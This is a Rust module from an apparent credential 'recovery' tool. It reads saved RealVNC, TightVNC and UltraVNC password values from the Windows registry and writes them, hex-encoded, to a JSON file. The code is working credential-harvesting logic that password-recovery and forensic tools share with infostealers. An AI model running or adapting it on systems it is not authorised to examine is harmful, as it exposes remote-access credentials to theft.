use crate::recovery::{
    context::RecoveryContext,
    output::write_json_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use serde::Serialize;
use std::sync::Arc;
use winreg::{HKEY, RegKey};
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};

pub fn vnc_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(VncTask)]
}

pub struct VncTask;

#[derive(Serialize)]
struct VncSummary {
    credentials: Vec<VncCredential>,
}

#[derive(Serialize)]
struct VncCredential {
    software: String,
    path: String,
    value_name: String,
    hex_data: String,
}

#[async_trait]
impl RecoveryTask for VncTask {
    fn label(&self) -> String {
        "VNC Credentials".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut credentials = Vec::new();

        // RealVNC Viewer (HKCU)
        collect_registry_binary(
            HKEY_CURRENT_USER,
            r"Software\RealVNC\vncviewer",
            "Password",
            "RealVNC Viewer",
            &mut credentials,
        );

        // RealVNC Server (HKLM)
        collect_registry_binary(
            HKEY_LOCAL_MACHINE,
            r"Software\RealVNC\vncserver",
            "Password",
            "RealVNC Server",
            &mut credentials,
        );

        // TightVNC Server (HKLM)
        collect_registry_binary(
            HKEY_LOCAL_MACHINE,
            r"Software\TightVNC\Server",
            "Password",
            "TightVNC Server",
            &mut credentials,
        );
        
        collect_registry_binary(
            HKEY_LOCAL_MACHINE,
            r"Software\TightVNC\Server",
            "ControlPassword",
            "TightVNC Control",
            &mut credentials,
        );

        // UltraVNC Server (HKLM)
        collect_registry_binary(
            HKEY_LOCAL_MACHINE,
            r"Software\ORL\WinVNC3",
            "Password",
            "UltraVNC Server",
            &mut credentials,
        );
        
        collect_registry_binary(
            HKEY_LOCAL_MACHINE,
            r"Software\ORL\WinVNC3\Default",
            "Password",
            "UltraVNC Default",
            &mut credentials,
        );

        if credentials.is_empty() {
            return Ok(Vec::new());
        }

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "vnc-credentials.json",
            &VncSummary { credentials },
        )
        .await?;

        Ok(vec![artifact])
    }
}

fn collect_registry_binary(
    hive: HKEY,
    path: &str,
    value_name: &str,
    software: &str,
    out: &mut Vec<VncCredential>,
) {
    if let Ok(key) = RegKey::predef(hive).open_subkey(path) {
        if let Ok(data) = key.get_raw_value(value_name) {
            let hex_data = hex::encode(&data.bytes);
            if !hex_data.is_empty() {
                out.push(VncCredential {
                    software: software.to_string(),
                    path: path.to_string(),
                    value_name: value_name.to_string(),
                    hex_data,
                });
            }
        }
    }
}
